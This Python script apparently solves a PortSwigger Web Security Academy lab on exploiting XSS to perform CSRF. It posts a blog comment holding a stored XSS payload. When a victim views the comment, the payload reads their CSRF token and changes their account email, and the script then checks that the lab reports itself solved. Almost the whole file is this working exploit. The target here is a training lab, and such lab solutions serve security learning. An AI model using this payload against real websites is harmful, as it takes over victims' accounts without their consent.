import requests
import argparse
import re
import webbrowser as wb
from time import sleep

parser = argparse.ArgumentParser(description='Solves the following Lab: Exploiting XSS to perform CSRF')
parser.add_argument('--id', action='store', help='lab ID, ex: 0a6e00ec03ca2e848083672100ee00fb', required=True)
lab = parser.parse_args()

r = requests.get("https://" + lab.id + ".web-security-academy.net/post/?postId=1")
cookie = {'Cookie':f"session={r.cookies.get('session')}"}
csrf = re.search(r'<input[^>]+name=["\']csrf["\'][^>]+value=["\'](.*?)["\']', r.text).group(1)

payload = '<script>window.addEventListener("DOMContentLoaded",(function(){var e=document.getElementsByName("csrf")[0].value,n=new FormData;n.append("csrf",e),n.append("email","xss@xss.com"),fetch("/my-account/change-email",{method:"POST",mode:"no-cors",body:n})}));</script>'
data={'csrf':csrf,'postId':'1','comment':payload,'name':'Stored XSS to CSRF','email':'xss@xss.com'}

r = requests.post("https://" + lab.id + ".web-security-academy.net/post/comment", headers=cookie, data=data, allow_redirects=False)

sleep(5)

try:
    assert('<p>Solved</p>' in requests.get("https://" + lab.id + ".web-security-academy.net/").text)
    print('Lab solved.')
except Exception:
    print("Error while trying to solve the lab.")
